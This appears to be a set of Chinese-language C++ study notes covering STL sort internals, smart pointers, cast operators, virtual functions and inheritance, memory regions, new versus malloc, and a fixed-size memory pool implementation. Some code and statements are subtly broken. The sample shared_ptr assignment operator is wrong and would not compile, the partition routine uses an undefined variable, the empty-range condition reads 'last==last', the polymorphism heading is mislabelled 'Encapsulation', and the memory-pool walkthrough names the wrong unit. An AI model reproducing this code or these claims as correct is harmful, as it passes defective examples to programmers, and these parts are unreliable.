元素在内部不以任何特定顺序排序，而是组织到桶中。元素被放进哪个桶完全依赖于其关键的哈希。这允许到单独元素的快速访问，因为哈希一旦计算，则它指代元素被放进的准确的桶。

## 算法

以有限的步骤解决逻辑或者数学上的问题，称为算法。Algorithm。

STL算法的一般形式：所有泛型算法的前两个参数都是一对迭代器（iterators），通常称为first和last，用于标示算法的操作区间。

STL中习惯采用前闭后开区间表示法，写成[first,last)，表示区间涵盖first至last（不含last）之间的所有元素。当last==last时，表示一个空区间。

### sort()

排序算法接受两个`RandomAccessIterators`(随机存取迭代器)，然后将区间内的所有元素以递增方式由小到大重新排列；也可以接受一个仿函数作为排序标准。

可以对vector，deque进行排序，因为他们的迭代器都属于`RandomAccessIterators`。对list进行排序需要使用他们自己的sort()成员函数。

STL中的`sort()`算法，数据量大时使用**快速排序**，分段递归排序。数据量小于某个门槛（16）时，为了避免快排的递归调用带来过大的额外负荷，使用**插排**。如果递归层次过深，还会使用**堆排**。

#### 插入排序

以双层循环的形式进行。外循环遍历整个序列，每次迭代决定出一个子区间；内循环遍历子区间，将子区间内的每一个“逆转对”倒转过来。

当数据量很少时效果很好，原因是因为STL中实现了一些技巧，同时不需要进行递归调用等操作，会减少额外负担。

```c++
void __insertion_sort(iterator first, iterator last){
	if(first == last) return;
	for(iterator i = first + 1; i != last; i++)			// 外循环
		__linear_insert(first, i, value_type(first));	// [first, i)形成一个子区间
}

// 辅助函数
void __linear_insert(iterator first, iterator last, T*){
    T value = *last;			// 记录尾元素
    if(value < *first){			// 当尾元素比头部小时
        copy_backward(first, last, last+1);		// 就一次性全部向后移动一位（****）
    	*first = value;
    }
    else						// 尾元素大于头部
        __unguarded_linear_insert(last, value);
}

// 辅助函数
void __unguarded_linear_insert(iterator last, T value){
    iterator next = last;
    --next;
    // 内循环
    // 注意，一旦不再出现逆转对，循环就结束，因为之后的都必定不是逆转对了，也就是都是排好序的了
    while(value < *next){
        *last = *next;
        last = next;
        --next;
    }
    *last = value;
}
```

#### 快速排序

快速排序是目前已知最快的排序法，平均复杂度尾`O(NlogN)`，最坏情况为`O(N2)`。不过内省排序（`IntroSort`）（一种与`median-of-three QuickSort`极为类似的算法）可以将最坏情况推进到`O(NlogN)`。

快速排序步骤为：

- 如果S的元素个数为0或者1，结束
- 取S中的任何一个元素，当作基准`pivot(v)`
- 将S分割为L，R两端，使L内的每个元素都小于或者等于v，R内的每一个元素都大于或者等于v
- 对L，R递归执行快排

分段的原则通常采用`median-of-three`，即取（首、尾，中央三值的中位数）

```c++
T& __median(const T& a, const T& b, const T& c){
	if(a < b)
        if(b < c)
            return b;
    	else if(a < c)
            return c;
    	else
            return a;
    else if(a < c)
        return a;
    else if(b < c)
        return c;
    else
        return b;
}
```

分割时使用两个迭代器，first向尾部移动，last向头部移动，当\*first大于或者等于基准时就停下来，\*last小于或者等于基准时也停下来，然后检验两个迭代器是否交错，如果first仍然在左，last仍然在右，就将两者交换，然后各自调整一个位置（向中间逼近），再继续进行相同的行为。如果发现两个迭代器交错了，表示已经调整完毕。

```c++
iterator __unguarded_partition(iterator first, iterator last, T pivot){
	while(true){
        while(*first < value) ++first;		// first找到>=pivot就停下来
        --last;
        while(pivot < *last) --last;
        if(first>=last)	return first;		// 交错，结束
        iter_swap(first, last);				// 大小值互换
        ++first;
    }	
}
```

#### 内省排序

不当的基准值选择，可能会导致不当的分割，导致快排时间复杂度恶化为`O(N2)`。内省排序的行为再大多数情况下和`median-of-three QuickSort`一致，但是当分割行为有恶化为二次的倾向时，能够自我检测转而使用堆排。

```c++
void __introsort_loop(iterator first, iterator last, T*, size depth_limit){
	while(last-first > 16){
        if(depth_limit == 0){			// 超过深度限制就进行堆排
        	partial_sort(first, last, last);
            return;
        }
        --depth_limit;		// 分了一层了
        // 使用median-of-three quicksort进行分割
        iterator cut = __unguarded_partition(first, last, T(__median(*first, *(first+(last-first)/2), *(last-1))));
        // 对右半段递归进行sort
        __introsort_loop(cut, last, value_type(first), depth_limit);
        last = cut;
        // 开始新的循环对做半段进行sort
    }
}

void sort(iterator first, iterator last){
    if(first != last){
        __introsort_loop(first, last, value_type(first), __lg(last-first)*2);	// lg函数为找到2^k <= n的最大值k，控制层数
        __final_insertion_sort(first, last);	// 经过上一步之后，每个子序列都有相当程度的排序，但尚未完成排序，这里进行最后的处理
    }
}

void __final_insertion_sort(iterator first, iterator last){
    if(last - first > __stl_threshold){
        __insertion_sort(first, first+__stl_threshold);
        __unguarded_insertion_sort(first+__stl_threshold, last);		// 里面调用__unguarded_linear_insert进行排序
    }
    else
        __insertion_sort(first, last);
}
```



# C++智能指针与强制转换

包含在#include <memory>头文件中，使用方法shared_ptr<T> 

## shared_ptr

- 多个智能指针可以共享同一个对象，对象的最后一个拥有者有责任销毁对象，并清理与该对象相关的所有资源。
- 实现共享式拥有（shared ownship）概念。多个智能指针指向相同对象，该对象和其相关资源会在“最后一个reference”时被释放，为了在结构较复杂的情景中执行上述工作，标准库提供了weak_ptr,     bad_weak_ptr, enable_shared_ptr等辅助类
- 支持定制型删除器，可防范cross-dll问题（对象在一个dll中被new创建，但在另一个dll中被delete销毁），自动解除互斥锁

### shared_ptr实现原理

使用引用计数（reference counting），引用计数就是所有管理同一个裸指针（raw pointer）的shared_ptr，都共享一个引用计数器。

每当一个shared_ptr被赋值（或者拷贝构造）给其他的shared_ptr时，这个共享的应用计数器就加1；

当一个shared_ptr被析构或者被用于管理其他裸指针时，这个计数器就减1；

如果此时发现引用计数器为0，那么说明它是管理这个指针的最后一个shared_ptr了，于是释放指针指向的资源。

```c++
template <typename T>
class shared_ptr{
public:
    shared_ptr(T *p) : count(new int(1)), _ptr(p) {}
    shared_ptr(shared_ptr<T> &other) : count(&(++*other.count)), _ptr(other._ptr) {}
    T *operator->() { return _ptr; }
    T &operator*() { return *_ptr; }
    shared_ptr<T> &operator=(shared_ptr<T> &other) {
        ++*other.count;
        if(this->_ptr && --*this->count == 0){
            // 这里对当前智能指针指向的对象进行判断，相当于先删掉左值，再用右值进行赋值。
            delete count;
            delete _ptr;
        }
        this->_ptr = other->_ptr;
        this->count = other;
        return *this;
    }

    ~shared_ptr() {
        if(--*count == 0){
            delete count;
            delete _ptr;
        }
    }
    int getRef() { return *count; }

private:
    int *count;
    T *_ptr;
};
```



## unique_ptr

- 是一种在异常时可以避免资源泄漏的智能指针。采用独占式拥有，意味着可以确保一个对象何其相应的资源同一时间只被一个pointer拥有。一旦拥有者被销毁或变成empty，或者开始拥有另一个对象，先前拥有的那个对象就会被销毁，其任何相应资源亦会被释放。
- 实现独占式拥有（exclusive  ownership）或者严格拥有（strict ownership）概念，保证同一时间内只有一个智能指针可以指向该对象。对于避免内存泄漏（如new后忘记delete）特别有用。
- 可以移交拥有权（具有转移语义），但是不会复制和共享（无法得到指向同一个对象的两个unique_ptr）
- 用于取代auto_ptr

### unique_ptr如何实现独占的

- unique_ptr的**构造函数被声明为explicit**，禁止隐式类型转换的行为
- unique_ptr的**拷贝构造和拷贝赋值均被声明为delete**，无法实现拷贝和赋值操作

## weak_ptr

- 允许共享但是不拥有某对象，一旦最末一个拥有该对象的智能指针失去了所有权，任何weak_ptr都会自动成空（empty）。
- 在default和copy构造函数之外，weak_ptr只提供“接收一个shared_ptr”的构造函数
- 可以打破环状引用（cycles of references，两个其实已经没有被使用的对象彼此互指，使之看似还在被使用的状态）的问题。

## auto_ptr(已弃用)

- 缺乏语言特性比如“针对构造和赋值”的move语义
- 赋值和分配会改变资源的所有权，不符合人的直觉，即源指针必须将所有权赋予目标指针，存在潜在的内存崩溃问题
- stl中无法使用auto_ptr，因为容器中的元素必须支持可复制和可赋值

## unique_ptr和auto_ptr区别

- auto_ptr可以复制拷贝，复制拷贝后的所有权转移；unique_ptr没有复制拷贝语义，但是实现了move语义，可以对所有权安全的转移。
- auto_ptr不能用来管理数组（析构调用delete），unique_ptr可以用来管理数组（析构调用delete[]）

## 智能指针的循环引用

```c++
class B;
class A{
public:
	shared_ptr<B> ptr;
};
class B{
public:
	shared_ptr<A> ptr;
};
int main(){
	while(true){
		shared_ptr<A> pa(new A());
		shared_ptr<B> pb(new B());
		pa->ptr = pb;
		pb->ptr = pa;
	}
	return 0;
}
```

上例中class A和class B的对象各自被两个智能指针管理，也就是A和B的引用计数都是2。当循环结束时，pa和pb的析构函数被调用，但是A对象和B对象仍然被一个智能指针管理，他们的引用计数变成1，于是这两个对象都无法释放，造成内存泄漏。

解决方法：将class A和class B中的shared_ptr改成weak_ptr即可，由于weak_ptr不会更改shared_ptr的引用计数，所以在pa和pb析构时，会正确的释放内存。

## 强制类型转换运算符<>()

### static_cast

- 用于比较自然且低风险的转换
- 用于非多态类型的转换
- 不执行运行时类型检查（安全性不如dynamic_cast）
- 通常用于转换数据类型
- 可以在整个类层次结构中移动指针，子类转换为父类安全（向上），父类转换为子类不安全；向上转换是一种隐式类型转换。
- 不能用于不同类型指针之间的互相转换，不能用于整形和指针之间的转换，不能用于不同类型引用之间的转换

### dynamic_cast

- 用于多态类型的转换
- 执行运行时类型检查
- 只适用于指针和引用
- 对不明确的指针的转换将失败（返回nullptr），但是不引发异常
- 可以在整个类层次结构中移动指针，包括向上或者向下转换
- 在进行引用的强制转换时，如果发现转换不安全，就会抛出一个异常，通过处理异常，就能发现不安全的转换。

### const_cast

- 用于删除const，volatile和__unaligned特性

### reinterpret_cast

- 用于位的简单重新解释
- 滥用会带来风险，除非所需转换本身时低级别的，否则应使用其他类型
- 允许将任何指针转换为任何其他指针类型（如char*到int\* ,但是本身并不安全）
- 允许将任何整数类型直接转换为任何指针类型以及反向转换
- 不能丢掉const，volatile和__unaligned特性
- 一个实际用途是在哈希函数中，即通过让两个不同的值几乎不以相同的索引结尾方式将值映射到索引（因为其允许将指针视为整数类型）。

### bad_cast

- 强制转换为引用类型失败，dynamic_cast运算符引发bad_cast异常。

# C++面向对象

面向对象程序设计（Object-Oriented Programming, OOP）是种具有对象概念的程序编程典范，同时也是一种程序开发的抽象方针。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-13\OOP.png" alt="img" style="zoom:100%;" />
</div>


面向对象三大特性：封装(Encapsulation)，继承(Inheritance)，多态(Polymorphism)

## 封装（Encapsulation）

- 把客观事物**封装成抽象的类**，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏
  - `public`成员：可以被**任意实体**访问
  - `protected`成员：只允许被**子类和本类的成员函数**访问
  - `private`成员：只允许被**本类的成员函数、友元类或者友元函数**访问

## 继承（Inheritance）

- 基类（父类）——>派生类（子类）

## 多态（Encapsulation）

- 多态，即多种状态（形态）。简单来说，我们可以将多态定义为消息以多种形式显示的能力
- 多态是以封装和继承为基础的
- C++ 多态分类及实现：
  - **静态多态（编译期）**
    - 函数重载，运算符重载，类模板，函数模板
  - **动态多态（运行期）**
    - 虚函数
- **为什么只有指针和引用能够完成多态？**
  - 因为引用或者指针既可以指向基类对象，也可以指向派生类对象中的基类部分。

### 静态多态（编译期/早绑定）

- 函数重载

```c++
class A{
public:
	void fun(int a);
	voif fun(int a, int b);
};
```

### 动态多态（运行期/晚绑定）

- 虚函数：使用`virtual`修饰成员函数，使其成为虚函数
  - 普通函数（非类成员函数）不能是虚函数
  - 静态函数（`static`）不能是虚函数
  - **构造函数不能是虚函数**（因为在调用构造函数时，虚表指针并没有在对象的内存空间中，必须要构造函数调用完成才会形成虚表指针）
  - 内联函数不能是表现多态时的虚函数

### 虚析构函数

- 析构函数可以是虚函数，是为了解决基类的指针指向派生类对象，并用基类的指针删除派生类对象（删除基类指针时会调用派生类析构函数，防止基类指针无法释放派生类内存资源）
- 用来做基类的类的析构函数一般都是虚析构函数

## 虚函数

用于实现多态机制，关于多态简而言之就是使用父类指针指向子类对象，然后通过父类指针调用子类对象的成员函数。

### 虚函数指针、虚函数表

- 虚函数指针（Virtual Function Pointer, `vfptr`）：在含有虚函数类的对象中，指向虚函数表，在运行时确定
- 虚函数表（Virtual Function Table）：在程序只读数据段（`.rodata section`）即**内存常量区**存放虚函数指针，如果派生类实现了基类的某个虚函数，则在虚表中**覆盖原本基类的那个虚函数指针**，在编译时根据类的声明创建

```c++
class base1{
public:
	int base1_1;
	int base1_2;
	virtual void base1_fun1(){}
	virtual void base1_fun2(){}
};
class derived1:public base1{
public:
	int derive1_1;
	int derive1_2;
};
```

- 上述的派生类的虚函数表指针为：

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-01-13\vfptr.png" alt="img" style="zoom:100%;" />
</div>



## 纯虚函数和虚函数

- 纯虚函数一种特殊的虚函数，在基类中不能对虚函数做出有意义的实现，而把他声明为纯虚函数，他的实现留给该基类的派生类去做

```c++
virtual int A() = 0;
```

- 类中如果声明了虚函数，那么这个函数是实现的，哪怕是空实现，他的作用就是为了能让这个函数在他的子类中可以被覆盖(override)，这样就可以使用晚绑定实现多态了。纯虚函数是一个接口，是个函数的声明而已，要留到子类里面实现
- 虚函数在子类里面可以不进行重写；纯虚函数必须在子类实现才可以实例化子类
- 虚函数的类用于”继承“，继承接口的同时也继承了父类的实现；纯虚函数关注的是接口的统一性，实现由子类完成
- 带纯虚函数的类被称为抽象类，这种类不能直接生成对象，而只能被被继承，并重写其虚函数后，才能使用。抽象类被继承后，子类可以继续是抽象类，也可以是普通类
- 虚基类是虚继承中的基类

### final和override

- final：用于限制某个类不能被继承，或者某个虚函数不能被重写

  - final只能用来修饰虚函数，并且要放到类或者函数的后面。

  - ```c
    class A{
    	virtual void foo() final;	// 限定foo()不能被重写
    	void bar() final;			// 错误，final只能修饰虚函数
    };
    class B final : A{				// 限定B不能被继承
    	void foo();					// 错误，foo()不能被重写
    };
    class C :B{};					// 错误，B不能被继承
    ```

- override：确保派生类中声明的重写函数于基类的虚函数有相同的签名，同时也明确表名将会重写基类的虚函数，还可以防止因疏忽而把原来想重写基类的虚函数声明为重载。

- 关键字要放在方法后面

### 构造函数可以是虚函数吗？

不能

- 构造一个对象的时候，必须知道对象的实际类型，而虚函数行为是在运行期间确定实际类型的
- 虚函数的执行依赖于虚函数表，而虚函数表在构造函数中进行初始化工作，即初始化vfptr，让他指向正确的虚函数表。

## 虚继承

- 虚继承用于解决多继承条件下的**菱形继承问题**（浪费存储空间、存在二义性）
- 底层实现原理与编译器相关，一般通过**虚基类指针**和**虚基类表**实现，每个虚继承的子类都有一个虚基类指针（占用一个指针的存储空间，4字节）和虚基类表（不占用类对象的存储空间）（需要强调的是，虚基类依旧会在子类里面存在拷贝，只是仅仅最多存在一份而已，并不是不在子类里面了）；当虚继承的子类被当做父类继承时，虚基类指针也会被继承
- 实际上，`vbptr` 指的是虚基类表指针（virtual base table pointer），该指针指向了一个虚基类表（virtual table），虚表中记录了虚基类与本类的偏移地址；通过偏移地址，这样就找到了虚基类成员，而虚继承也不用像普通多继承那样维持着公共基类（虚基类）的两份同样的拷贝，节省了存储空间。

## 虚继承和虚函数区别

- 相同之处：都使用了虚指针（均占用类的存储空间）和虚表（均不占用类的存储空间）
- 不同之处：
  - 虚继承：
    - 虚基类依旧存在派生类中，只占用存储空间
    - 虚基类表存储的是虚基类相对直接继承类的偏移
  - 虚函数：
    - 虚函数不占用存储空间
    - 虚函数表存储的是虚函数地址

## 模板类、成员模板、虚函数

- 模板类可以使用虚函数
- 一个类（无论是普通类还是类模板）的成员模板（本身是模板的成员函数）不能是虚函数

## 抽象类、接口类、聚合类

- 抽象类：含有纯虚函数的类
- 接口类：仅含有纯虚函数的抽象类
- 聚合类：用户可以直接访问其成员，并且具有特殊的初始化语法形式。满足如下特点：
  - 所有成员都是 public
  - 没有定义任何构造函数
  - 没有类内初始化
  - 没有基类，也没有 virtual 函数

# C++内存管理和链接

## C++内存空间分配

- 计算机中的程序内存分布图如下图所示

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-15\memory.png" alt="img" style="zoom:40%;" />
</div>


- 栈（Stack）：由编译器自动分配和释放，存放函数运行时分配的**局部变量（包括局部常量，不可修改性由编译器保证，可以`const_cast`）、函数参数值、返回数据、返回地址**等。操作类似于数据结构中的栈
- 动态链接库：用于在程序运行期间加载和卸载动态链接库
- 堆（Heap）：一般**由程序员分配**，如果程序员没有释放，程序结束时可能由操作系统回收。`malloc(),calloc(),free()`操作的就是这块内存
- 全局数据区（global data）：存放**全局变量、静态变量（包括静态局部和静态全局）**等，这块内存有读写权限，因此他们的值在程序运行期间可以任意改变。程序结束之后由系统释放
- 常量区（文字常量区）：存放**一般的常量、常量字符串**，这块内存只有读权限，因此在运行期间不能改变。程序结束后由系统释放
- 代码区：存放函数体的二进制代码

```c++
#include <stdio.h>
char *str1 = "hello word";	//字符串在常量区，str1在全局数据区
int n;	// 全局数据区
char* fun(){
	char* str = "hello world";	//字符串在常量区，str在栈区
	return str;
}
int main(){
	int a;	//栈
	char *str2 = "01234";	//字符串在常量区，str2在栈区
	char arr[20] = "56789";	//字符串和arr都在栈区
	char *pstr = fun();	//栈
	static int c = 0;	//全局数据区
	char *p1 = (char*)malloc(10);	//p1在栈区，分配的10字节的堆区
	strcpy(p1, "01234");	//01234在常量区，编译器可能会将它与str2指向的"01234"优化为一个地方
	
	reutrn 0;
}
```

### 三种内存分配方式

- 从全局数据区分配：内存在程序编译的时候已经分配好，这块内存在程序的整个运行期间都存在，例如全局变量，静态变量
- 在栈上分配：在执行函数时，函数内局部变量的存储单元可以在栈上创建，函数执行结束后，这些内存单元会自动被释放；栈内存分配运算内置于处理器的指令集，效率高，但是分配的内存容量有限
- 从堆上分配：动态内存分配，程序在运行的时候使用malloc或者new申请的内存，程序自行负责何时用free或者delete释放内存。在堆上申请空间，有责任回收它，否则会出现内存泄漏

## 堆和栈的区别

- 碎片问题：堆，频繁的new/delete势必会造成内存空间的不连续，从而造成大量的碎片，使程序效率降低；栈没有这个问题
- 生长方向：堆向上；栈向下
- 分配方式：堆是动态分配的，没有静态分配的堆；栈有两种方式：静态分配由编译器完成，比如全局变量的分配，动态分配由`alloca`函数进行，但是栈的动态分配由编译器进行释放，无需手动操作
- 分配效率：堆的分配是c/c++函数库提供的，机制很复杂，为了分配一块内存，库函数首先会搜索有没有足够大的空间，如果没有就调用系统功能增加程序数据段的内存空间然后返回；栈式机器系统提供的数据结构，计算机在底层对栈提供支持，比如分配专门的寄存去存放栈的地址，压栈和出栈都有专门的指令执行，所以栈的效率很高
- 管理方式：堆由程序员手动申请和释放；栈由编译器进行管理

```c++
//下式表示new在堆上申请一块内存，然后在栈中存放一个指向这块堆内存的指针p
int* p = new int[6];
```

## 什么时候用堆，什么时候用栈

- 与堆相比，栈不会导致内存碎片，分配效率高：如果少量数据需要频繁的操作，那么在程序中动态申请少量栈内存会获得很好的性能提升
- 堆可以申请的内存大很多：与堆相比，栈的使用不是那么灵活，如果分配大量的内存空间，应当使用堆。

## C++内存管理函数

- `malloc`：申请指定字节数的内存。申请到的内存中的初始值不确定
- `calloc`：为指定长度的对象，分配能容纳其指定个数的内存。申请到的内存的每一位（bit）都初始化为 0
- `realloc`：更改以前分配的内存长度（增加或减少）。当增加长度时，可能需将以前分配区的内容移到另一个足够大的区域，而新增区域内的初始值则不确定
- `alloca`：在栈上申请内存。程序在出栈的时候，会自动释放内存。但是需要注意的是，`alloca`不具可移植性, 而且在没有传统堆栈的机器上很难实现。`alloca`不宜使用在必须广泛移植的程序中

### malloc和free

- 用于分配、释放内存

```c++
//申请内存，并确认申请是否成功
char *str = (char*)malloc(100);
assert(str!=nullptr);
//释放内存并置空指针
free(p);
p = nullptr;
```

### malloc和free底层实现

- 空闲存储空间以空闲链表的方式组织（地址递增），每个块包含一个长度、一个指向下一块的指针以及一个指向自身存储空间的指针。（因为程序中的某些地方可能不通过malloc申请内存，索引malloc管理的空间不一定连续）
- 当有申请请求时，malloc会扫描空闲链表，直到找到一个足够大的块为止（首次适应）（因此每次调用malloc时并不是花费了完全相同的时间）
- 如果该块恰好与请求的大小相符，则将其从链表中移走并返回给用户。如果该块太大，则将其分为两部分，尾部部分留给用户，剩下的部分留在空闲链表中（更改头部信息）。因此malloc分配的是一块连续的内存。
- 释放时，首先搜索空闲链表，找到可以插入被释放的合适位置，如果与被释放块相邻的任一边是空闲块，则将这两个块合为一个更大的块，以减少内存碎片。

### new和delete

- `new/new[]`：完成两件事，先底层调用`malloc`分配了内存，然后调用构造函数（创建对象）
- `delete/delete[]`：也完成两件事，先调用析构函数（清理资源），然后底层调用`free`释放空间
- `new`在申请内存时会自动计算所需字节数，而`malloc`则需要我们自己输入申请内存空间的字节数

```c++
T* t = new T();
delete t;
```

### new和delete的底层实现

在底层通过调用operator new/delete全局函数来实现申请/释放空间。

#### new底层

operator new函数通过malloc来申请空间，当malloc申请空间成功时则直接返回；申请空间失败时抛出bad_alloc类型异常。

**对于内置类型new**：new和malloc基本类似；唯一不同的是new失败会抛异常，malloc失败会返回NULL

**对于自定义类型new**：调用operator new函数申请空间；在申请的空间上执行构造函数，完成对象的构造。

**new[N]**：调用operator new[]函数，在operator new[]函数中实际调用operator new函数完成N个对象空间的申请；在申请的空间上执行N次构造函数。

#### delete底层

operator delete函数通过free来释放空间。

**对于内置类型delete**：和free基本类似

**对于自定义类型delete**：在空间上执行析构函数，完成对象中资源的清理工作；调用operator delete函数释放对象的空间

**对于自定义类型delete[]**：在释放的对象空间上执行N次析构函数，完成N个对象中资源的清理；调用operator delete[]释放空间，内部使用operator delete进行释放。

**对于数组类型怎么删除的**：需要在new[]的时候保存数组的维度，c++的做法是在分配数组空间时多分配4个字节大小的空间，专门保存数组的大小，在delete[]时就可以取出这个数，然后调用析构。

### malloc和new区别

- malloc是库函数，需要头文件支持<memory.h>；new是关键字，需要编译器支持
- new/delete基于malloc/free实现

- **分配内存的位置：**malloc是从堆上动态分配内存，new是从**自由存储区**（堆是操作系统维护的一块内存，是一个物理概念，自由存储区是C++中通过new和delete动态分配和释放的对象的存储区，是一个逻辑概念）为对象动态分配内存。
- **返回类型安全性：**malloc内存分配成功返回void*，然后再强制类型转换为需要的类型；new操作符分配内存成功后返回与对象类型相匹配的指针类型，因此new是类型安全的操作符。
- **内存分配失败返回值：**malloc内存分配失败后返回NULL；new失败会抛出异常（bad_alloc），可以使用try-catch语句对这个异常进行捕获处理
- **分配内存的大小的计算：**malloc需要显示的指出所需内存的尺寸；new申请内存分配时无需指定内存块的大小，编译器会根据类型信息自行计算。
- **是否调用构造/析构函数：**new会调用对象的构造函数来完成对象的构造，malloc不会
- **对数组的处理**：new[]和delete[]用来专门处理数组类型，他会调用构造函数初始化每一个数组元素，然后释放对象时为每个对象调用析构函数，但是两者需要配套使用；malloc，不知道要在这块空间放置什么内容，就只给出一个原始的空间，再给一个内存地址，如果需要开辟一个数组的内存，需要我们手动自定数组的大小。
- **是否可以被重载**：new/delete可以被重载，malloc/free不可以被重载
- **分配内存时内存不足**：malloc动态分配内存后，如果不够用可以使用realloc函数重新实现内存的扩充；而new没有这样的操作。

### 定位new（placement new）

- 允许向`new`传递额外的地址参数，从而在预先指定的内存区域创建对象

```c++
new (place_address) type
new (place_address) type (initializers)
new (place_address) type [size]
new (place_address) type [size] {braced initializer list}
```

- `place_address`是一个指针
- `initializers`提供一个（可能为空）以逗号分隔的初始值列表

> delete this 合法吗？
>
> - 合法，但是
>   - 必须保证 this 对象是通过 `new`（不是 `new[]`、不是 placement new、不是栈上、不是全局、不是其他对象成员）分配的
>   - 必须保证调用 `delete this` 的成员函数是最后一个调用 this 的成员函数
>   - 必须保证成员函数的 `delete this` 后面没有调用 this 了

## 如何定义一个只能在堆上（栈上）生成对象的类？

### 只能在堆上

- 方法：将析构函数设置为私有
- 原因：C++ 是静态绑定语言，编译器管理栈上对象的生命周期，编译器在为类对象分配栈空间时，会先检查类的析构函数的访问性。若析构函数不可访问，则不能在栈上创建对象

### 只能在栈上

- 方法：将new和delete设置为私有
- 原因：在堆上生成对象，使用 new 关键词操作，其过程分为两阶段：第一阶段，使用 new 在堆上寻找可用内存，分配给对象；第二阶段，调用构造函数生成对象。将 new 操作设置为私有，那么第一阶段就无法完成，就不能够在堆上生成对象

## 内存池（Memory Pool）

应用程序可以通过系统的内存分配调用预先一次性申请适当大小的内存作为一个内存池，之后应用程序自己对内存的内配和释放可以通过这个内存池来完成。只有当内存池大小需要动态扩展时，才需要再调用系统的内存分配函数。

内存池可以分为单线程内存池和多线程内存池。也可以分为固定（每次分配的内存单元大小确认）内存池和可变（每次分配的大小可变）内存池。

### 默认内存管理函数的不足

使用默认的new/delete和malloc/free在堆上分配和释放内存会有一些额外的开销。应用程序频繁的在堆上分配和释放内存，就会导致性能的损失，并且会使系统中出现大量的内存碎片，降低内存的使用率。

### 内存池工作原理

固定内存池由一系列固定大小的**内存块**组成，每一个内存块又包含了固定数量和大小的**内存单元**。

![图6-1  固定内存池](..\assets\post\others\memorypool.png)

在内存池初次生成时，只向系统申请了一个内存块，返回的指针作为整个内存池的头指针。之后随着应用程序对内存的不断需求，内存池判断需要动态扩大时，才再次向系统申请新的内存块，并把所**有这些内存块通过指针链接起来**。

当应用程序需要通过该内存池分配一个单元大小的内存时，**只需要简单遍历所有的内存池块头信息**，快速定位到还有空闲单元的那个内存池块。然后根据该块的块头信息直接定位到第1个空闲的单元地址，把这个地址返回，并且标记下一个空闲单元即可；当应用程序释放某一个内存池单元时，直接在对应的内存池块头信息中标记该内存单元为空闲单元即可。

相当于系统管理内存相比，内存池主要由以下优点：

- 针对特殊情况，例如需要频繁释放固定大小的内存对象时，不需要复杂的分配算法和多线程保护。也不需要维护内存空闲表的额外开销，从而获得较高的性能
- 由于开辟一定数量的连续内存空间作为内存吃块，因而从一定程度上提高了程序局部性，提升了系统性能
- 比较容易控制页边界对齐和内存字节对齐，没有内存碎片的问题

### 内存池实现

```c++
// 内存块结构体
struct MemoryBlock {
    uint16_t        nSize;
    uint16_t        nFree;
    uint16_t        nFirst;
    MemoryBlock*    pNext;
    char            aData[1];

    static void* operator new(size_t, uint16_t types, uint16_t unitSize){
        return ::operator new(sizeof(MemoryBlock) + types * unitSize);
    }
    static void operator delete(void *p, size_t){
        ::operator delete(p);
    }
    MemoryBlock(uint16_t units = 1, uint16_t unitSize = 0)
        : nSize(units * unitSize)
        , nFree(units-1)		// 注意第0个单元在初始化的时候就回分配出去
        , nFirst(1)
        , pNext(NULL){
    	char* pData = aData;		// 0编号单元
        for(uint16_t i = 1; i < units; i++){	// 为每个单元头两个字节赋值编号
            *reinterpret_cast<uint16_t*>(pData) = i;
            pData += unitSize;
        }
    }
};

// 内存池结构体
class MemoryPool {
private:
    MemoryBlock*    pBlock;		// 内存块链表头指针
    uint16_t        nUnitSize;	// 内存单元大小
    uint16_t        nInitSize;	// 第一次创建的内存块所包含的分配单元的个数
    uint16_t        nGrowSize;	// 随后创建的内存块所包含的分配单元个数
public:
    MemoryPool(uint16_t unitSize, uint16_t initSize = 2014, uint16_t growSize = 256)
    	: pBlock(NULL)
        , nUnitSize(unitSize)
		, nInitSize(initSize)
		, nGrowSize(growSize) {
		if (unitSize > 4)
			nUnitSize = (unitSize + (MEMPOOL_ALIGNMENT - 1)) & ~(MEMPOOL_ALIGNMENT - 1);
		else if (unitSize <= 2)
			nUnitSize = 2;
		else
			nUnitSize = 4;
	}
    ~MemoryPool(){	// 析构
    	MemoryBlock *p = pBlock;
		while (p) {
			MemoryBlock *pTemp = p->pNext;
			delete p;
			p = pTemp;
		}
    }
    MemoryBlock* newInitBlock() const {
		return new(nInitSize, nUnitSize) MemoryBlock(nInitSize, nUnitSize);
	}
	MemoryBlock* newGrowBlock() const {
		return new(nGrowSize, nUnitSize) MemoryBlock(nGrowSize, nUnitSize);
	}
    void* Alloc();
    void  Free(void* p);
};
```

![图6-2  内存池的数据结构](..\assets\post\others\memorypoolstruct.png)

#### 运行机制

- 在运行过程中，内存池可能会有多个内存块，这些内存块是从进程堆中开辟的一个较大的连续内存区域，有一个MemoryBlock结构体和多个可供分配的内存单元组成，所有内存块组成一个内存块链表，MemoryPool中的pBlock指针就是这个链表的头。每个内存块中的pNext指针指向下一个内存块。
- 每个内存块由两部分组成，即一个MemoryBlock结构体和多个内存分配单元（固定大小nUnitSize），MemoryBlock只维护还未分配单元的信息。nFree记录内存块中还有多少单元没有分配，nFirst记录下一个可供分配的单元的编号，每**个可分配单元的头两个字节记录了紧跟它之后的下一个自由分配单元的编号**，这样利用每个自由分配单元的头两个字节，所有的自由分配单元被链接起来。
- 当有新的内存请求，先遍历内存块链表，直到找到某个还有自由分配单元的内存块（nFree>0）。取得nFirst值，然后根据这个编号定位到该自由分配单元的起始位置（固定大小可以通过编号定位），将该位置起始2字节数据赋值为nFirst成员，同时nFree-1，将定位到的内存单元起始地址作为此次内存请求的返回地址返回。
- 如果找不到自由分配单元（第一次请求内存或者内存分配单元都被分配时会发生），就从进程堆上申请一个新的内存块。然后对该内存块进行初始化
  - 设置MemoryBlock结构体的nSize为所有内存分配单元的大小
  - nFree为n-1，nFirst为1（因为单元0已经马上被分配出去）
  - 将编号0后面的所有自由分配单元连接起来。从aData作为第0个单元的地址开始，每个nUnitSize大小取其头两个字节，记录期之后的自由分配的编号。
  - 返回内存块的第9个分配单元的起始地址，即aData地址
- 当某个被分配单元delete回收时，该单元并不会返回给堆，而是返回给MemoryPool。MemroyPool遍历其维护的内存块链表，判断该单元的起始地址是否在某个内存块中。如果在，就把该内存分配单元加到这个内存块的MemoryBlock维护的自由分配单元链表头部，同时nFree+1；如果不在，说明这个被回收的单元不属于这个MemoryPool。
- 回收之后，如果内存块的所有内存分配单元都是自由的即nFree=n，那么这个内存块就会被移出MemoryPool并作为一个整体返回给进程堆；如果还有非自由分配单元，这时就把该内存块移动到MemoryPool**内存块链表的头部**，这样可以减少MemoryPool的遍历次数。

